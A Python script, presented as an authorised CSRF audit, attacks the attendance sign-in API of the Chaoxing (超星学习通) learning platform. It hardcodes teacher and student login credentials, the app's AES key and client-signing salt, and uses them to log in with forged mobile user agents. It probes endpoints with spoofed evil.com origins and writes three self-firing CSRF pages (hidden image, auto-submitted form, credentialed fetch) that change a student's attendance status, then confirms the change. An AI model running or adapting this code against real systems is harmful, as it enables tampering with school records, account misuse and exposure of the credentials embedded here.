#!/usr/bin/env python3
"""
CSRF漏洞测试脚本 - 超星学习通教师端签到API
授权安全审计
"""

import base64, hashlib, json, uuid, requests, urllib3, time, re
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

urllib3.disable_warnings()

AES_KEY = b"u2oh6Vu^HWe4_AES"
SCHILD_SALT = "ipL$TkeiEmfy1gTXb2XHrdLN0a@7c^vu"
LOGIN_URL = "https://passport2.chaoxing.com/fanyalogin"
BASE = "https://mobilelearn.chaoxing.com"
COURSE_ID = "257485372"
CLASS_ID = "132821141"

# ========== 登录函数 ==========

def aes_enc(p):
    c = AES.new(AES_KEY, AES.MODE_CBC, AES_KEY)
    return base64.b64encode(c.encrypt(pad(p.encode(), AES.block_size))).decode()

def schild_sign(model, locale, version, build, imei):
    parts = [f"(schild:{SCHILD_SALT})", f"(device:{model})", f"Language/{locale}",
             f"com.chaoxing.mobile/ChaoXingStudy_3_{version}_android_phone_{build}",
             f"(@Kalimdor)_{imei}"]
    return hashlib.md5(" ".join(parts).encode()).hexdigest()

def get_mobile_ua():
    imei = uuid.uuid4().hex[:32]
    sc = schild_sign("MI10", "zh_CN", "6.7.2", "10941_314", imei)
    return (f"Mozilla/5.0 (Linux; Android 16; MI10 Build/OPM1.171019.019; wv) "
            f"AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36 "
            f"(schild:{sc}) (device:MI10) Language/zh_CN "
            f"com.chaoxing.mobile/ChaoXingStudy_3_6.7.2_android_phone_10941_314 "
            f"(@Kalimdor)_{imei}")

def login(phone, pwd):
    s = requests.Session()
    s.verify = False
    ua = get_mobile_ua()
    s.headers.update({"User-Agent": ua, "Accept": "application/json, text/plain, */*", "Accept-Language": "zh_CN"})
    s.post(LOGIN_URL, data={"fid": "-1", "uname": aes_enc(phone), "password": aes_enc(pwd),
                            "refer": "http%3A%2F%2Fi.mooc.chaoxing.com", "t": "true",
                            "forbidotherlogin": "0", "validate": "", "doubleFactorLogin": "0",
                            "independentId": "0", "independentNameId": "0"},
           allow_redirects=False, timeout=30)
    puid = ""
    for c in s.cookies:
        if c.name in ("UID", "_uid"):
            puid = c.value
    try: s.get("https://i.chaoxing.com/base", timeout=20, allow_redirects=True)
    except: pass
    try: s.get("https://mooc1-api.chaoxing.com/mooc-ans/mycourse/backclazzdata?view=json&m=0", timeout=20)
    except: pass
    return s, puid

def safe_json(r):
    try: return r.json()
    except: return {"_raw_status": r.status_code, "_raw_text": r.text[:500]}

# ========== 辅助函数 ==========

def get_active_list(session, puid):
    """获取活动列表"""
    r = session.get(f"{BASE}/ppt/activeAPI/taskactivelist",
                    params={"courseId": COURSE_ID, "classId": CLASS_ID, "uid": puid}, timeout=20)
    d = safe_json(r)
    return d.get("activeList", []) if isinstance(d, dict) else []

def find_sign_active(session, puid):
    """找到一个签到类型的活动"""
    active_list = get_active_list(session, puid)
    for act in active_list:
        atype = act.get("activeType", -1)
        if atype in (2, 74):  # 签到类型
            return str(act.get("id", ""))
    return None

def create_sign_activity(teacher_session):
    """教师创建签到活动"""
    ajax_hdr = {"Referer": f"{BASE}/", "X-Requested-With": "XMLHttpRequest",
                "Content-Type": "application/x-www-form-urlencoded"}
    
    create_attempts = [
        {"courseId": COURSE_ID, "classId": CLASS_ID, "activeType": "2", "title": "CSRF安全测试签到"},
        {"courseId": COURSE_ID, "classId": CLASS_ID, "activeType": "2", "title": "CSRF安全测试", "signType": "0"},
        {"courseId": COURSE_ID, "classId": CLASS_ID, "activeType": "2", "title": "CSRF安全测试",
         "ifTiJiao": "1", "duration": "0", "signType": "0"},
    ]
    
    for i, data in enumerate(create_attempts):
        r = teacher_session.post(f"{BASE}/ppt/activeAPI/createActive", data=data, headers=ajax_hdr, timeout=20)
        d = safe_json(r)
        print(f"  创建尝试{i+1}: {json.dumps(d, ensure_ascii=False)[:200]}")
        if isinstance(d, dict) and d.get("result"):
            aid_candidate = str(d.get("result", ""))
            if aid_candidate and len(aid_candidate) > 5:
                print(f"  创建成功! aid={aid_candidate}")
                return aid_candidate
    
    # 尝试其他路径
    alt_paths = ["/newsign/createActive", "/pptSign/createActive", "/pptSign/startSign"]
    for path in alt_paths:
        data = {"courseId": COURSE_ID, "classId": CLASS_ID, "activeType": "2",
                "title": "CSRF安全测试", "signType": "0"}
        r = teacher_session.post(f"{BASE}{path}", data=data, headers=ajax_hdr, timeout=20)
        d = safe_json(r)
        print(f"  {path}: {json.dumps(d, ensure_ascii=False)[:200]}")
        if isinstance(d, dict) and d.get("result"):
            aid_candidate = str(d.get("result", ""))
            if aid_candidate and len(aid_candidate) > 5:
                print(f"  创建成功! aid={aid_candidate}")
                return aid_candidate
    
    return None

def get_sign_status(session, active_id, student_uid):
    """查询学生签到状态"""
    r = session.get(f"{BASE}/v2/apis/sign/signIn",
                    params={"activeId": active_id, "uid": student_uid}, timeout=20)
    d = safe_json(r)
    if isinstance(d, dict) and "data" in d and isinstance(d["data"], dict):
        return d["data"].get("status")
    return None

# ========== CSRF测试函数 ==========

def check_success(r):
    """检查请求是否成功修改了状态"""
    try:
        data = r.json()
        if data.get("result") == 1 or data.get("result") is True:
            return True, "success", data
        if "success" in str(data).lower():
            return True, "success_in_response", data
        return False, f"result={data.get('result', 'N/A')}, msg={data.get('msg', data.get('errorMsg', ''))[:100]}", data
    except:
        if r.status_code == 500:
            return False, "500_Internal_Server_Error", None
        if r.status_code == 200:
            return True, "200_but_non_json", None
        return False, f"HTTP_{r.status_code}", None

def test_get_csrf(session, url, query_params, post_data, test_name):
    """测试1: GET方法CSRF - 将所有参数放在URL查询字符串中"""
    result = {"test": test_name, "category": "GET方法CSRF", "vulnerable": False, "details": ""}
    try:
        # 合并query_params和post_data到GET参数中
        get_params = {}
        get_params.update(query_params)
        get_params.update(post_data)
        r = session.get(url, params=get_params, timeout=30)
        result["status_code"] = r.status_code
        result["response_text"] = r.text[:500]
        success, msg, data = check_success(r)
        if success:
            result["vulnerable"] = True
            result["details"] = f"GET请求成功执行了状态修改操作: {msg}"
        else:
            result["details"] = f"GET请求未成功修改: {msg}"
    except Exception as e:
        result["details"] = f"请求异常: {str(e)}"
    return result

def test_referer_check(session, url, query_params, post_data, test_name):
    """测试2: Referer检查"""
    results = []
    
    test_cases = [
        ("evil_referer", {"Referer": "https://evil.com/"}),
        ("no_referer", {"Referer": ""}),  # 空Referer
        ("correct_referer", {"Referer": f"{BASE}/"}),
    ]
    
    for case_name, extra_headers in test_cases:
        r_item = {"test": f"{test_name}_{case_name}", "category": "Referer检查", "vulnerable": False, "details": ""}
        try:
            headers = {"Content-Type": "application/x-www-form-urlencoded"}
            headers.update(extra_headers)
            r = session.post(url, params=query_params, data=post_data, headers=headers, timeout=30)
            r_item["status_code"] = r.status_code
            r_item["response_text"] = r.text[:500]
            success, msg, data = check_success(r)
            if success:
                r_item["vulnerable"] = True
                r_item["details"] = f"{case_name}: 请求成功执行 - {msg}"
            else:
                r_item["details"] = f"{case_name}: 请求被拒绝 - {msg}"
        except Exception as e:
            r_item["details"] = f"请求异常: {str(e)}"
        results.append(r_item)
    
    return results

def test_custom_header(session, url, query_params, post_data, test_name):
    """测试3: 自定义头要求"""
    results = []
    
    test_cases = [
        ("no_xhr_header", {"Content-Type": "application/x-www-form-urlencoded",
                           "Referer": f"{BASE}/"}),
        ("no_custom_headers", {"Content-Type": "application/x-www-form-urlencoded"}),
        ("only_content_type", {"Content-Type": "application/x-www-form-urlencoded"}),
    ]
    
    for case_name, headers in test_cases:
        r_item = {"test": f"{test_name}_{case_name}", "category": "自定义头检查", "vulnerable": False, "details": ""}
        try:
            r = session.post(url, params=query_params, data=post_data, headers=headers, timeout=30)
            r_item["status_code"] = r.status_code
            r_item["response_text"] = r.text[:500]
            success, msg, data = check_success(r)
            if success:
                r_item["vulnerable"] = True
                r_item["details"] = f"{case_name}: 请求成功 - {msg}"
            else:
                r_item["details"] = f"{case_name}: 请求被拒绝 - {msg}"
        except Exception as e:
            r_item["details"] = f"请求异常: {str(e)}"
        results.append(r_item)
    
    return results

def test_content_type_variations(session, url, query_params, post_data, test_name):
    """测试4: Content-Type变体"""
    results = []
    
    content_types = [
        ("application/x-www-form-urlencoded", "urlencoded"),
        ("multipart/form-data", "multipart"),
        ("text/plain", "text"),
        ("application/json", "json"),
    ]
    
    for ct, mode in content_types:
        r_item = {"test": f"{test_name}_ct_{ct.replace('/', '_').replace(';', '_')}", 
                  "category": "Content-Type变体", "content_type": ct, "vulnerable": False, "details": ""}
        try:
            if mode == "multipart":
                r = session.post(url, params=query_params, 
                                files={k: (None, str(v)) for k, v in post_data.items()}, timeout=30)
            elif mode == "json":
                r = session.post(url, params=query_params, json=post_data, timeout=30)
            else:
                r = session.post(url, params=query_params, data=post_data, 
                                headers={"Content-Type": ct}, timeout=30)
            r_item["status_code"] = r.status_code
            r_item["response_text"] = r.text[:500]
            success, msg, data = check_success(r)
            if success:
                r_item["vulnerable"] = True
                r_item["details"] = f"Content-Type: {ct} 请求成功执行 - {msg}"
            else:
                r_item["details"] = f"Content-Type: {ct} 请求未成功 - {msg}"
        except Exception as e:
            r_item["details"] = f"请求异常: {str(e)}"
        results.append(r_item)
    
    return results

def test_origin_check(session, url, query_params, post_data, test_name):
    """测试5: Origin检查"""
    results = []
    
    test_cases = [
        ("evil_origin", {"Origin": "https://evil.com", "Referer": "https://evil.com/",
                         "Content-Type": "application/x-www-form-urlencoded"}),
        ("no_origin", {"Content-Type": "application/x-www-form-urlencoded",
                       "Referer": f"{BASE}/"}),
        ("correct_origin", {"Origin": BASE, "Referer": f"{BASE}/",
                            "Content-Type": "application/x-www-form-urlencoded"}),
    ]
    
    for case_name, headers in test_cases:
        r_item = {"test": f"{test_name}_{case_name}", "category": "Origin检查", "vulnerable": False, "details": ""}
        try:
            r = session.post(url, params=query_params, data=post_data, headers=headers, timeout=30)
            r_item["status_code"] = r.status_code
            r_item["response_text"] = r.text[:500]
            success, msg, data = check_success(r)
            if success:
                r_item["vulnerable"] = True
                r_item["details"] = f"{case_name}: 请求成功执行 - {msg}"
            else:
                r_item["details"] = f"{case_name}: 请求被拒绝 - {msg}"
        except Exception as e:
            r_item["details"] = f"请求异常: {str(e)}"
        results.append(r_item)
    
    return results

def get_cookies_jar(session):
    """安全获取cookies，处理重复cookie名称问题"""
    jar = requests.cookies.RequestsCookieJar()
    seen = set()
    for c in session.cookies:
        key = (c.name, c.domain, c.path)
        if key not in seen:
            jar.set(c.name, c.value, domain=c.domain, path=c.path)
            seen.add(key)
    return jar

def test_cookie_only_auth(session, url, query_params, post_data, test_name):
    """测试6: 仅Cookie认证"""
    result = {"test": test_name, "category": "仅Cookie认证", "vulnerable": False, "details": ""}
    try:
        cookies = get_cookies_jar(session)
        minimal_headers = {
            "Content-Type": "application/x-www-form-urlencoded",
        }
        r = requests.post(url, params=query_params, data=post_data, cookies=cookies, 
                         headers=minimal_headers, verify=False, timeout=30)
        result["status_code"] = r.status_code
        result["response_text"] = r.text[:500]
        success, msg, data = check_success(r)
        if success:
            result["vulnerable"] = True
            result["details"] = f"仅Cookie认证即可执行操作 - {msg}"
        else:
            result["details"] = f"仅Cookie请求被拒绝 - {msg}"
    except Exception as e:
        result["details"] = f"请求异常: {str(e)}"
    return result

# ========== PoC生成函数 ==========

def generate_get_poc(active_id, student_uid):
    """生成GET方式CSRF PoC"""
    html = f"""<!DOCTYPE html>
<html>
<head><title>Loading...</title></head>
<body>
<img src="https://mobilelearn.chaoxing.com/pptSign/updateSignStatusByUidsV2?DB_STRATEGY=PRIMARY_KEY&STRATEGY_PARA=activeId&activeId={active_id}&uids={student_uid}&status=1&remark=" width="0" height="0" />
<p>Page loaded.</p>
</body>
</html>"""
    with open("/workspace/csrf_get_poc_v2.html", "w", encoding="utf-8") as f:
        f.write(html)
    print(f"  [+] GET CSRF PoC 已生成: /workspace/csrf_get_poc_v2.html")

def generate_post_poc(active_id, student_uid):
    """生成POST方式CSRF PoC"""
    html = f"""<!DOCTYPE html>
<html>
<head><title>Loading...</title></head>
<body>
<h1>页面加载中...</h1>
<form id="csrf_form" method="POST" action="https://mobilelearn.chaoxing.com/pptSign/updateSignStatusByUidsV2?DB_STRATEGY=PRIMARY_KEY&STRATEGY_PARA=activeId&activeId={active_id}">
    <input type="hidden" name="uids" value="{student_uid}" />
    <input type="hidden" name="status" value="1" />
    <input type="hidden" name="remark" value="" />
</form>
<script>
document.getElementById('csrf_form').submit();
</script>
</body>
</html>"""
    with open("/workspace/csrf_post_poc_v2.html", "w", encoding="utf-8") as f:
        f.write(html)
    print(f"  [+] POST CSRF PoC 已生成: /workspace/csrf_post_poc_v2.html")

def generate_fetch_poc(active_id, student_uid):
    """生成Fetch方式CSRF PoC"""
    html = f"""<!DOCTYPE html>
<html>
<head><title>Loading...</title></head>
<body>
<h1>页面加载中...</h1>
<script>
fetch('https://mobilelearn.chaoxing.com/pptSign/updateSignStatusByUidsV2?DB_STRATEGY=PRIMARY_KEY&STRATEGY_PARA=activeId&activeId={active_id}', {{
    method: 'POST',
    headers: {{
        'Content-Type': 'application/x-www-form-urlencoded',
    }},
    body: 'uids={student_uid}&status=1&remark=',
    credentials: 'include'
}}).then(response => response.text()).then(data => {{
    console.log('CSRF request completed:', data);
}}).catch(error => {{
    console.error('CSRF request failed:', error);
}});
</script>
</body>
</html>"""
    with open("/workspace/csrf_fetch_poc_v2.html", "w", encoding="utf-8") as f:
        f.write(html)
    print(f"  [+] Fetch CSRF PoC 已生成: /workspace/csrf_fetch_poc_v2.html")

# ========== 主测试流程 ==========

def main():
    all_results = []
    
    # ===== 1. 登录 =====
    print("=" * 60)
    print("超星学习通 CSRF 漏洞测试 - 授权安全审计")
    print("=" * 60)
    
    print("\n[*] 正在登录教师账号...")
    teacher_session, teacher_puid = login("19712720708", "3.1415926Cpy")
    print(f"  教师PUID: {teacher_puid}")
    if not teacher_puid:
        print("  [!] 教师登录可能失败，PUID为空")
    
    print("[*] 正在登录学生账号...")
    student_session, student_puid = login("18436633997", "3.1415926Cpy")
    print(f"  学生PUID: {student_puid}")
    if not student_puid:
        print("  [!] 学生登录可能失败，PUID为空")
    
    student_uid = student_puid or "431407443"
    
    # ===== 2. 获取/创建activeId =====
    print("\n[*] 正在获取签到活动ID...")
    
    # 先尝试从活动列表获取
    active_id = find_sign_active(teacher_session, teacher_puid)
    
    if not active_id:
        print("[*] 未找到现有签到活动，尝试创建新的...")
        active_id = create_sign_activity(teacher_session)
    
    if not active_id:
        # 尝试从学生端获取
        print("[*] 尝试从学生端获取活动列表...")
        active_list = get_active_list(student_session, student_uid)
        for act in active_list:
            atype = act.get("activeType", -1)
            if atype in (2, 74):
                active_id = str(act.get("id", ""))
                print(f"  从学生端找到活动: {active_id}")
                break
    
    if not active_id:
        print("[!] 无法获取activeId，尝试使用活动列表中的第一个活动...")
        active_list = get_active_list(teacher_session, teacher_puid)
        if active_list:
            active_id = str(active_list[0].get("id", ""))
            print(f"  使用第一个活动: {active_id}")
    
    if not active_id or active_id == "0":
        print("[!] 无法获取有效的activeId，CSRF测试可能无法正常进行")
        active_id = "0"
    
    print(f"  活动ID (activeId): {active_id}")
    print(f"  学生UID: {student_uid}")
    
    # 验证活动是否可用
    if active_id != "0":
        status = get_sign_status(teacher_session, active_id, student_uid)
        print(f"  当前学生签到状态: {status}")
    
    # ===== 3. 定义API端点和参数 =====
    # 注意: V2端点的DB_STRATEGY和STRATEGY_PARA作为查询参数(query params)
    # 其他参数作为POST body
    
    endpoints = {
        "pptSign_V2": {
            "path": "/pptSign/updateSignStatusByUidsV2",
            "url": f"{BASE}/pptSign/updateSignStatusByUidsV2",
            "query_params": {
                "DB_STRATEGY": "PRIMARY_KEY",
                "STRATEGY_PARA": "activeId",
                "activeId": active_id,
            },
            "post_data": {
                "uids": student_uid,
                "status": "1",
                "remark": "",
            }
        },
        "newsign": {
            "path": "/newsign/updateSignStatus",
            "url": f"{BASE}/newsign/updateSignStatus",
            "query_params": {
                "DB_STRATEGY": "PRIMARY_KEY",
                "STRATEGY_PARA": "activeId",
                "activeId": active_id,
            },
            "post_data": {
                "uids": student_uid,
                "status": "1",
                "remark": "",
                "activeId": active_id,
                "classId": CLASS_ID,
                "courseId": COURSE_ID,
                "uid": student_uid,
            }
        }
    }
    
    # ===== 4. 执行CSRF测试 =====
    for ep_name, ep_info in endpoints.items():
        print(f"\n{'=' * 60}")
        print(f"[*] 测试端点: {ep_info['path']}")
        print(f"{'=' * 60}")
        
        url = ep_info["url"]
        query_params = ep_info["query_params"]
        post_data = ep_info["post_data"]
        
        # 测试1: GET方法CSRF
        print(f"\n  [1] GET方法CSRF测试...")
        r = test_get_csrf(teacher_session, url, query_params, post_data, f"{ep_name}_GET_CSRF")
        all_results.append(r)
        print(f"      结果: {'⚠️ 存在漏洞' if r['vulnerable'] else '✓ 不存在漏洞'} - {r['details'][:100]}")
        
        # 测试2: Referer检查
        print(f"\n  [2] Referer检查测试...")
        referer_results = test_referer_check(teacher_session, url, query_params, post_data, ep_name)
        all_results.extend(referer_results)
        for rr in referer_results:
            print(f"      {rr['test']}: {'⚠️ 存在漏洞' if rr['vulnerable'] else '✓ 不存在漏洞'} - {rr['details'][:100]}")
        
        # 测试3: 自定义头检查
        print(f"\n  [3] 自定义头检查测试...")
        header_results = test_custom_header(teacher_session, url, query_params, post_data, ep_name)
        all_results.extend(header_results)
        for hr in header_results:
            print(f"      {hr['test']}: {'⚠️ 存在漏洞' if hr['vulnerable'] else '✓ 不存在漏洞'} - {hr['details'][:100]}")
        
        # 测试4: Content-Type变体
        print(f"\n  [4] Content-Type变体测试...")
        ct_results = test_content_type_variations(teacher_session, url, query_params, post_data, ep_name)
        all_results.extend(ct_results)
        for cr in ct_results:
            print(f"      {cr['content_type']}: {'⚠️ 存在漏洞' if cr['vulnerable'] else '✓ 不存在漏洞'} - {cr['details'][:100]}")
        
        # 测试5: Origin检查
        print(f"\n  [5] Origin检查测试...")
        origin_results = test_origin_check(teacher_session, url, query_params, post_data, ep_name)
        all_results.extend(origin_results)
        for orr in origin_results:
            print(f"      {orr['test']}: {'⚠️ 存在漏洞' if orr['vulnerable'] else '✓ 不存在漏洞'} - {orr['details'][:100]}")
        
        # 测试6: 仅Cookie认证
        print(f"\n  [6] 仅Cookie认证测试...")
        cookie_result = test_cookie_only_auth(teacher_session, url, query_params, post_data, f"{ep_name}_cookie_only")
        all_results.append(cookie_result)
        print(f"      结果: {'⚠️ 存在漏洞' if cookie_result['vulnerable'] else '✓ 不存在漏洞'} - {cookie_result['details'][:100]}")
    
    # ===== 5. 生成CSRF PoC =====
    print(f"\n{'=' * 60}")
    print("[*] 生成CSRF PoC文件...")
    print(f"{'=' * 60}")
    
    generate_get_poc(active_id, student_uid)
    generate_post_poc(active_id, student_uid)
    generate_fetch_poc(active_id, student_uid)
    
    # ===== 6. 验证CSRF实际效果 =====
    print(f"\n{'=' * 60}")
    print("[*] 验证CSRF实际效果...")
    print(f"{'=' * 60}")
    
    csrf_verification = {"verified": False, "steps": []}
    
    if active_id == "0":
        print("  [!] 无有效activeId，跳过CSRF实际效果验证")
        csrf_verification["error"] = "无有效activeId"
    else:
        # Step 1: 用教师session设置学生状态为缺席(status=0)
        print("\n  [步骤1] 设置学生状态为缺席(status=0)...")
        v2_url = endpoints["pptSign_V2"]["url"]
        v2_query = dict(endpoints["pptSign_V2"]["query_params"])
        set_absent_data = dict(endpoints["pptSign_V2"]["post_data"])
        set_absent_data["status"] = "0"
        
        try:
            r = teacher_session.post(v2_url, params=v2_query, data=set_absent_data, timeout=30,
                                    headers={"Referer": f"{BASE}/", "X-Requested-With": "XMLHttpRequest",
                                             "Content-Type": "application/x-www-form-urlencoded"})
            step1_result = {"action": "set_absent", "status_code": r.status_code, "response": r.text[:300]}
            csrf_verification["steps"].append(step1_result)
            print(f"      响应: {r.text[:200]}")
            time.sleep(2)
            
            # 验证状态已变为0
            status_after = get_sign_status(teacher_session, active_id, student_uid)
            print(f"      设置后状态: {status_after}")
        except Exception as e:
            step1_result = {"action": "set_absent", "error": str(e)}
            csrf_verification["steps"].append(step1_result)
            print(f"      异常: {e}")
        
        # Step 2: 模拟CSRF GET请求（教师session cookies，无自定义头）
        print("\n  [步骤2] 模拟CSRF GET请求（设置status=1）...")
        csrf_get_params = dict(v2_query)
        csrf_get_params.update({"uids": student_uid, "status": "1", "remark": ""})
        
        try:
            cookies = get_cookies_jar(teacher_session)
            csrf_headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml,*/*",
            }
            r = requests.get(v2_url, params=csrf_get_params, cookies=cookies, 
                             headers=csrf_headers, verify=False, timeout=30)
            step2_result = {"action": "csrf_get", "status_code": r.status_code, "response": r.text[:300]}
            csrf_verification["steps"].append(step2_result)
            print(f"      响应: {r.text[:200]}")
            
            success, msg, data = check_success(r)
            if success:
                csrf_verification["verified"] = True
                print("      [!!!] CSRF GET攻击验证成功！状态已通过GET请求修改")
            else:
                print(f"      CSRF GET未成功修改状态: {msg}")
            time.sleep(2)
            
            # 验证状态
            status_after_get = get_sign_status(teacher_session, active_id, student_uid)
            print(f"      CSRF GET后状态: {status_after_get}")
        except Exception as e:
            step2_result = {"action": "csrf_get", "error": str(e)}
            csrf_verification["steps"].append(step2_result)
            print(f"      异常: {e}")
        
        # Step 3: 模拟CSRF POST请求（跨域Origin + Referer）
        print("\n  [步骤3] 模拟CSRF POST请求（设置status=1）...")
        try:
            # 先设为缺席
            teacher_session.post(v2_url, params=v2_query, data=set_absent_data, timeout=30,
                                headers={"Referer": f"{BASE}/", "X-Requested-With": "XMLHttpRequest",
                                         "Content-Type": "application/x-www-form-urlencoded"})
            time.sleep(2)
            
            # CSRF POST with evil origin/referer
            csrf_post_data = dict(endpoints["pptSign_V2"]["post_data"])
            csrf_post_data["status"] = "1"
            cookies = get_cookies_jar(teacher_session)
            csrf_post_headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": "https://evil.com",
                "Referer": "https://evil.com/",
            }
            r = requests.post(v2_url, params=v2_query, data=csrf_post_data, cookies=cookies,
                              headers=csrf_post_headers, verify=False, timeout=30)
            step3_result = {"action": "csrf_post", "status_code": r.status_code, "response": r.text[:300]}
            csrf_verification["steps"].append(step3_result)
            print(f"      响应: {r.text[:200]}")
            
            success, msg, data = check_success(r)
            if success:
                csrf_verification["verified"] = True
                print("      [!!!] CSRF POST攻击验证成功！状态已通过跨域POST请求修改")
            else:
                print(f"      CSRF POST未成功修改状态: {msg}")
            time.sleep(2)
            
            # 验证状态
            status_after_post = get_sign_status(teacher_session, active_id, student_uid)
            print(f"      CSRF POST后状态: {status_after_post}")
        except Exception as e:
            step3_result = {"action": "csrf_post", "error": str(e)}
            csrf_verification["steps"].append(step3_result)
            print(f"      异常: {e}")
        
        # Step 4: 对 /newsign/updateSignStatus 也做CSRF验证
        print("\n  [步骤4] 对 /newsign/updateSignStatus 进行CSRF验证...")
        newsign_url = endpoints["newsign"]["url"]
        newsign_query = dict(endpoints["newsign"]["query_params"])
        
        try:
            # 先用教师设为缺席
            set_absent_ns = dict(endpoints["newsign"]["post_data"])
            set_absent_ns["status"] = "0"
            teacher_session.post(newsign_url, params=newsign_query, data=set_absent_ns, timeout=30,
                                headers={"Referer": f"{BASE}/", "X-Requested-With": "XMLHttpRequest",
                                         "Content-Type": "application/x-www-form-urlencoded"})
            time.sleep(2)
            
            # CSRF POST with evil origin
            csrf_ns_data = dict(endpoints["newsign"]["post_data"])
            csrf_ns_data["status"] = "1"
            cookies = get_cookies_jar(teacher_session)
            r = requests.post(newsign_url, params=newsign_query, data=csrf_ns_data, cookies=cookies,
                              headers={"Content-Type": "application/x-www-form-urlencoded",
                                       "Origin": "https://evil.com", "Referer": "https://evil.com/"},
                              verify=False, timeout=30)
            step4_result = {"action": "csrf_newsign_post", "status_code": r.status_code, "response": r.text[:300]}
            csrf_verification["steps"].append(step4_result)
            print(f"      响应: {r.text[:200]}")
            
            success, msg, data = check_success(r)
            if success:
                csrf_verification["verified"] = True
                print("      [!!!] /newsign/ CSRF POST攻击验证成功！")
            else:
                print(f"      /newsign/ CSRF POST未成功: {msg}")
            time.sleep(2)
            
            status_after_ns = get_sign_status(teacher_session, active_id, student_uid)
            print(f"      /newsign/ CSRF后状态: {status_after_ns}")
        except Exception as e:
            step4_result = {"action": "csrf_newsign_post", "error": str(e)}
            csrf_verification["steps"].append(step4_result)
            print(f"      异常: {e}")
    
    # ===== 7. 汇总结果 =====
    print(f"\n{'=' * 60}")
    print("[*] CSRF漏洞测试结果汇总")
    print(f"{'=' * 60}")
    
    # 统计漏洞数量
    total_tests = len(all_results)
    vulnerable_tests = [r for r in all_results if r.get("vulnerable")]
    vuln_count = len(vulnerable_tests)
    
    # 按类别统计
    categories = {}
    for r in all_results:
        cat = r.get("category", "未知")
        if cat not in categories:
            categories[cat] = {"total": 0, "vulnerable": 0}
        categories[cat]["total"] += 1
        if r.get("vulnerable"):
            categories[cat]["vulnerable"] += 1
    
    print(f"\n  总测试数: {total_tests}")
    print(f"  发现漏洞数: {vuln_count}")
    print(f"  漏洞率: {vuln_count/total_tests*100:.1f}%" if total_tests > 0 else "N/A")
    
    print(f"\n  按类别统计:")
    for cat, stats in categories.items():
        status = "⚠️ 存在漏洞" if stats['vulnerable'] > 0 else "✓ 安全"
        print(f"    {cat}: {stats['vulnerable']}/{stats['total']} {status}")
    
    print(f"\n  CSRF实际效果验证: {'✅ 成功' if csrf_verification.get('verified') else '❌ 未成功'}")
    
    # 漏洞详情
    if vulnerable_tests:
        print(f"\n  ⚠️ 发现的漏洞详情:")
        for v in vulnerable_tests:
            print(f"    [{v.get('category')}] {v.get('test')}: {v.get('details', '')[:150]}")
    else:
        print(f"\n  未发现CSRF漏洞（可能原因：活动ID无效或API已修复）")
    
    # ===== 8. 保存结果 =====
    output = {
        "audit_info": {
            "platform": "超星学习通 (ChaoXing)",
            "audit_type": "CSRF漏洞测试",
            "date": time.strftime("%Y-%m-%d %H:%M:%S"),
            "endpoints_tested": [ep["path"] for ep in endpoints.values()],
            "active_id": active_id,
            "student_uid": student_uid,
        },
        "summary": {
            "total_tests": total_tests,
            "vulnerable_tests": vuln_count,
            "vulnerability_rate": f"{vuln_count/total_tests*100:.1f}%" if total_tests > 0 else "N/A",
            "csrf_verified": csrf_verification.get("verified", False),
        },
        "category_summary": categories,
        "test_results": all_results,
        "csrf_verification": csrf_verification,
        "poc_files": [
            "/workspace/csrf_get_poc_v2.html",
            "/workspace/csrf_post_poc_v2.html",
            "/workspace/csrf_fetch_poc_v2.html",
        ],
    }
    
    with open("/workspace/task7_results.json", "w", encoding="utf-8") as f:
        json.dump(output, f, ensure_ascii=False, indent=2)
    
    print(f"\n[+] 结果已保存到: /workspace/task7_results.json")
    print(f"[+] PoC文件已生成:")
    print(f"    - /workspace/csrf_get_poc_v2.html")
    print(f"    - /workspace/csrf_post_poc_v2.html")
    print(f"    - /workspace/csrf_fetch_poc_v2.html")
    
    return output

if __name__ == "__main__":
    results = main()
